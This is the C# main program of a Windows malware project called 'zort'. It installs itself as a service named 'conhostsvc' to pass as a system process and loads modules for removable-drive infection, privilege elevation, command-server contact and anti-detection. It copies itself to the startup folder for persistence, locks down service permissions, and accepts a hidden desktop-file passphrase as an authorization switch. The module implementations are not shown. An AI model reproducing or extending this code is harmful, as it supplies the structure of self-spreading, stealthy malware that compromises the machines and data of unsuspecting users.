using System;
using System.Collections.Generic;
using System.IO;
using System.ServiceProcess;

namespace zort
{
    class Program : ServiceBase
    {
        readonly List<IPayloadModule> modules = new List<IPayloadModule>
                {
                    new RemovableInfector(),
                    new ElevationHelper(),
                    new ServiceManager(),
                    new ServerCon(),
                    new AntiDetection(),
                };

        public Program()
        {
            ServiceName = "conhostsvc";
        }

        static void Main(string[] args)
        {
            //if is admin install and start service else just init modules normally
            bool isAdmin = ElevationHelper.IsElevated();
            if (isAdmin)
            {
                using (var service = new Program())
                {
                    if (Environment.UserInteractive)
                    {
                        service.OnStart(args);
                        //Console.WriteLine("Press any key to stop the service...");
                        while (true)
                        {
                            Console.ReadLine();
                        }
                        //service.OnStop();
                    }
                    else
                    {
                        ServiceBase.Run(service);
                    }
                }
            }
            else
            {
                var program = new Program();
                RemovableInfector.CheckIfRunningFromRemovableDrive();
                if (!RemovableInfector.IsSystemInfected()) PersistenceHelper.MoveAndRunFromStartup();
                else Environment.Exit(0);
                program.InitModules();
                //Console.WriteLine("Press any key to exit...");
                while (true)
                {
                    Console.ReadLine();
                }
            }
        }

        protected override void OnStart(string[] args)
        {
            try
            {
                Console.WriteLine("Setting DACL rules.");
                RemovableInfector.CheckIfRunningFromRemovableDrive();
                InitModules();
                PersistenceHelper.SetDACL();
            }
            catch (Exception ex)
            {
                System.IO.File.AppendAllText("C:\\service-error.log", $"[{DateTime.Now}] ERROR: {ex}\n");
                throw;
            }
        }

        protected override void OnStop()
        {
            StopModules();
            base.OnStop();
        }

        private void StopModules()
        {
            modules.ForEach(m =>
            {
                Console.WriteLine($"Stopping module {m.ModuleName}");
                m.Stop();
            });
        }

        private void InitModules()
        {
            bool isAdmin = ElevationHelper.IsElevated();

            // Check if legally elevated
            if (isAdmin)
            {
                if (File.Exists(ElevationHelper.GetElevationFilePath()))
                {
                    Console.WriteLine("Elevation file exists, indicating a legal elevation. continue action");
                    File.Delete(ElevationHelper.GetElevationFilePath());
                }
                else
                {
                    isAdmin = false;

                    Console.WriteLine("Elevation file does not exist, indicating an illegal elevation. Checking for a file on the desktop...");

                    // Check if there is a file called asdfmovie.txt in desktop
                    string desktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
                    string filePath = Path.Combine(desktopPath, "pookiebear.txt");
                    if (!File.Exists(filePath)) goto modules;
                    //Validate the file contents. it should contain "hey boyz!!"
                    string fileContents = File.ReadAllText(filePath);
                    if (!fileContents.Contains("hey boyz!!")) goto modules;
                    Console.WriteLine("File contents are valid. authorized exec.");
                    isAdmin = true;
                }
            }

            modules:

                modules.ForEach(m =>
                {
                    switch (m.ElevationType)
                    {
                        case ElevationType.Elevated:
                            if (!isAdmin)
                            {
                                Console.WriteLine($"Skipping module {m.ModuleName}, it requires admin privileges.");
                                return;
                            }
                            break;
                        case ElevationType.NonElevated:
                            if (isAdmin)
                            {
                                Console.WriteLine($"Skipping module {m.ModuleName}, it does not need to work unelevated.");
                                return;
                            }
                            break;
                    }

                    Console.WriteLine($"Starting module {m.ModuleName}");
                    m.Start();
                });
            }
        }
    }
